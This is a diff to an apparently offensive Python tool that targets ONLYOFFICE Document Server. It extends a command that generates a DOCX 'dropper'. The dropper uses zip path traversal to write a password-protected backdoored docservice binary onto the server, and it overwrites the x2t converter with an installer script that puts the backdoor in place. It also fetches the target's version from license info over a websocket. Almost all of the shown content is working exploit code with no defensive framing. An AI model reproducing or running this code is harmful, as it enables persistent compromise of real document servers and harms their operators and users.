@@ -64,13 +64,22 @@ def sign_url( url, secret ):
   return url + '&md5=' + h
 
 # Generate a docx dropper for a backdoored docservice bin
-def generate_backdoor( docservicepath, password, version, traversedepth ):
+def generate_backdoor( serverroot, password, version, traversedepth ):
+  
+  print('Building payload for:')
+  print(' - Server root:', serverroot)
+  print(' - Password:', password)
+  print(' - Version:', version)
+  print(' - Traverse depth:', traversedepth)
+
   # Create build dir
   scriptdir = os.path.dirname(__file__)
   builddir = scriptdir + '/build'
   dsbin = scriptdir + '/bin/docservice'
+  x2tbin = scriptdir + '/bin/x2t'
+  installer = scriptdir + '/src/docservice-installer.sh'
   if not os.path.isdir( builddir ):
-    shutil.makedirs( builddir )
+    os.makedirs( builddir )
 
   # Clone server repo
 
@@ -87,13 +96,25 @@ def generate_backdoor( docservicepath, password, version, traversedepth ):
   # Open as zip
   zipObj = ZipFile( docfile,'a')
   root = '../' * traversedepth
-  path = root + docservicepath
+  if serverroot.startswith('/'): serverroot = serverroot[1:]
+  x2tpath = root + serverroot + '/FileConverter/bin/x2t'
+  dspath  = root + serverroot + '/DocService/docservice'
+  
+  # Write new docservice
   with open( dsbin, 'rb' ) as f:
-    
-    # Write path traversal + docservice
-    zipObj.writestr( path , f.read() )
-  zipObj.close()
+    zipObj.writestr( dspath + '.new', f.read() )
 
+  # Write legit x2t
+  with open( x2tbin, 'rb' ) as f:
+    zipObj.writestr( x2tpath + '.new', f.read() )
+
+  # Overwrite x2t with installer script
+  with open( installer, 'r' ) as f: 
+    zipObj.writestr( x2tpath, f.read() )
+  
+  zipObj.close()
+  print('Done, backdoor dropper written to', docfile)
+  sys.exit()
   return
 
 class WsClient():
@@ -391,7 +412,7 @@ def main():
 
   # Generate DOCX which drops a backdoored version of document server
   bdparse = subparsers.add_parser('backdoor', help='Generate a DOCX which drops a backdoored version of document server')
-  bdparse.add_argument('--docservice', help='Full path to docservice bin on target server', default='/var/www/onlyoffice/documentserver/server/DocService/docservice')
+  bdparse.add_argument('--serverroot', help='Full path to docserver files', default='/var/www/onlyoffice/documentserver/server')
   bdparse.add_argument('--password',help='Password to protect backdoor from any old random from using it', default=bdpassword)
   bdparse.add_argument('--version',help='Which ONLYOFFICE version to build for')
   bdparse.add_argument('--depth', type=int, help='Depth of path traversal chars (../) required to reach root of filesystem', default=10)
@@ -473,11 +494,17 @@ def main():
 
   # Create backdoor file
   if args.command == 'backdoor':
+    
+    # Give license response a chance to come back
+    while not client.license:
+      print('Waiting for license info to come back...')
+      time.sleep(1)
     if args.version:
       version = args.version
     else:
-      version = client.license['buildVersion'] + '.' + client.license['buildNumber']
-    generate_backdoor( args.docservice, args.password, version, args.depth )
+      version = client.license['buildVersion'] + '.' + str( client.license['buildNumber'] )
+      client.close()
+    generate_backdoor( args.serverroot, args.password, version, args.depth )
 
 if __name__ == '__main__':
   main()
